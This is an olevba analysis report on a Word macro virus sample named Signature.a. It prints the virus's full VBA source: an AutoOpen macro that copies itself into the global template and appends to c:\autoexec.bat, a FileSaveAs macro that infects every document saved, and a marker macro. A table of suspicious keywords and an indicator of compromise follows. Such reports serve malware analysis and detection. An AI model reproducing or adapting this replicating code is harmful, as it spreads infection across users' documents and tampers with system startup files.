olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Signature.a-bc81cff87ec013d18a22d0cf5968ab8d856609bb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Signature.a-bc81cff87ec013d18a22d0cf5968ab8d856609bb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Signature.a-bc81cff87ec013d18a22d0cf5968ab8d856609bb - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Automatically executes when the file is opened and installs the macro virus."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim Title$
Dim TotalMacros
Dim CurrentMacro
Dim AlreadyInstalled
Dim Install
Dim CurrentFile$
Dim CopyParameter$
Dim name_$

On Error GoTo -1: On Error GoTo Finish
Title$ = "HELL for Windows"
TotalMacros = WordBasic.CountMacros(0)
For CurrentMacro = 1 To TotalMacros
    If WordBasic.[MacroName$](CurrentMacro) = "Signature" Then
        AlreadyInstalled = -1
    End If
Next CurrentMacro
If AlreadyInstalled Then
End If
If Not AlreadyInstalled Then
Install = 1
If Install Then
    CurrentFile$ = WordBasic.[FileName$]()  'Put current filename into Currentfile$
    CopyParameter$ = CurrentFile$ + ":AutoOpen" 'Make #1 arg for MacroCp
    WordBasic.MacroCopy CopyParameter$, "Global:AutoOpen"   'in MacroCopy command
    CopyParameter$ = CurrentFile$ + ":Signature"
    WordBasic.MacroCopy CopyParameter$, "Global:Signature"
    CopyParameter$ = CurrentFile$ + ":FileSaveAs"
    WordBasic.MacroCopy CopyParameter$, "Global:FileSaveAs"
End If
End If
name_$ = "c:\autoexec.bat"
Open name_$ For Append As 1
Print #1, "WIN"
Close 1
Finish:

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Signature.a-bc81cff87ec013d18a22d0cf5968ab8d856609bb - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Copies the virus from NORMAL.DOT onto every document saved using SaveAs."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim CurrentFile$
Dim CopyParameter$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
CurrentFile$ = WordBasic.[FileName$]()
CopyParameter$ = CurrentFile$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:FileSaveAs", CopyParameter$
CopyParameter$ = CurrentFile$ + ":Signature"
WordBasic.MacroCopy "Global:Signature", CopyParameter$
CopyParameter$ = CurrentFile$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoOpen", CopyParameter$
WordBasic.FileSaveAs dlg    'This line is part of the Word default
End Sub
-------------------------------------------------------------------------------
VBA MACRO Signature.bas 
in file: Virus.MSWord.Signature.a-bc81cff87ec013d18a22d0cf5968ab8d856609bb - OLE stream: 'Macros/VBA/Signature'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "The virus signature file.\r\n"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Signature.MAIN"

    Rem Chris' Word macro virus signature file.

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

